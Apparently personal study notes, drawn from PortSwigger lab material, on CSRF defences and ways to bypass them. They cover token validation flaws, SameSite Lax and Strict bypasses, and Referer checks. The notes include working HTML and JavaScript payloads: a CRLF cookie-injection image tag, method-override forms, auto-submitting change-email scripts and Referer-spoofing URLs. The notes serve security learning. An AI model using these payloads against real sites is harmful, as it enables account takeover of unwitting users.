xss, a self-contained attack would look like this:

```

### Common defences against CSRF <a href="#common-defences-against-csrf" id="common-defences-against-csrf"></a>

* **CSRF tokens** - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.
* **SameSite cookies** - SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from triggering these actions cross-site. Since 2021, Chrome enforces `Lax` SameSite restrictions by default. As this is the proposed standard, we expect other major browsers to adopt this behavior in future.
* **Referer-based validation** - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This is generally less effective than CSRF token validation.

## Bypassing CSRF token validation

#### Validation of CSRF token depends on request method <a href="#validation-of-csrf-token-depends-on-request-method" id="validation-of-csrf-token-depends-on-request-method"></a>

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

#### Validation of CSRF token depends on token being present <a href="#validation-of-csrf-token-depends-on-token-being-present" id="validation-of-csrf-token-depends-on-token-being-present"></a>

Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

In this situation, the attacker can remove the entire parameter containing the token (not just its value)

#### CSRF token is not tied to the user session <a href="#csrf-token-is-not-tied-to-the-user-session" id="csrf-token-is-not-tied-to-the-user-session"></a>

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

#### CSRF token is tied to a non-session cookie <a href="#csrf-token-is-tied-to-a-non-session-cookie" id="csrf-token-is-tied-to-a-non-session-cookie"></a>

In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

`<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`

#### CSRF token is simply duplicated in a cookie <a href="#csrf-token-is-simply-duplicated-in-a-cookie" id="csrf-token-is-simply-duplicated-in-a-cookie"></a>

In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie.POST /email/change `HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 68`\
`Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa`

`csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.co`m

In this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

## Bypassing SameSite cookie restrictions <a href="#bypassing-samesite-cookie-restrictions" id="bypassing-samesite-cookie-restrictions"></a>

#### Bypassing SameSite Lax restrictions using GET requests <a href="#bypassing-samesite-lax-restrictions-using-get-requests" id="bypassing-samesite-lax-restrictions-using-get-requests"></a>

If they also use `Lax` restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a `GET` request from the victim's browser.

Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:

`<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> <input type="hidden" name="_method" value="GET"> <input type="hidden" name="recipient" value="hacker"> <input type="hidden" name="amount" value="1000000"> </form>`

Other frameworks support a variety of similar parameters.

```
<script>
    document.location = "https://0abd000e03a9850081ba5d6200000042.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

#### Bypassing SameSite restrictions using on-site gadgets <a href="#bypassing-samesite-restrictions-using-on-site-gadgets" id="bypassing-samesite-restrictions-using-on-site-gadgets"></a>

If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

#### Bypassing SameSite restrictions via vulnerable sibling domains <a href="#bypassing-samesite-restrictions-via-vulnerable-sibling-domains" id="bypassing-samesite-restrictions-via-vulnerable-sibling-domains"></a>

Make sure you thoroughly audit all of the available attack surface, including any sibling domains. In particular, vulnerabilities that enable you to elicit an arbitrary secondary request, such as XSS, can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks.

#### Bypassing SameSite Lax restrictions with newly issued cookies <a href="#bypassing-samesite-lax-restrictions-with-newly-issued-cookies" id="bypassing-samesite-lax-restrictions-with-newly-issued-cookies"></a>

As mentioned earlier, if a website doesn't include a `SameSite` attribute when setting a cookie, Chrome automatically applies `Lax` restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.

To trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current OAuth session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack.

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

## Bypassing Referer-based CSRF defenses <a href="#bypassing-referer-based-csrf-defenses" id="bypassing-referer-based-csrf-defenses"></a>

Aside from defenses that employ CSRF tokens, some applications make use of the HTTP `Referer` header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.

#### Validation of Referer depends on header being present <a href="#validation-of-referer-depends-on-header-being-present" id="validation-of-referer-depends-on-header-being-present"></a>

Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted.

```
<meta name="referrer" content="never">
```

#### Validation of Referer can be circumvented <a href="#validation-of-referer-can-be-circumvented" id="validation-of-referer-can-be-circumvented"></a>

Some applications validate the `Referer` header in a naive way that can be bypassed. For example, if the application validates that the domain in the `Referer` starts with the expected value, then the attacker can place this as a subdomain of their own domain:

`http://vulnerable-website.com.attacker-website.com/csrf-attack`

Likewise, if the application simply validates that the `Referer` contains its own domain name, then the attacker can place the required value elsewhere in the URL:

```
http://attacker-website.com/csrf-attack?vulnerable-website.com
```

1.  Create a CSRF proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab and host it on the exploit server. Edit the JavaScript so that the third argument of the `history.pushState()` function includes a query string with your lab instance URL as follows:

    `history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")`

    This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
2.  If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:

    `Referrer-Policy: unsafe-url`
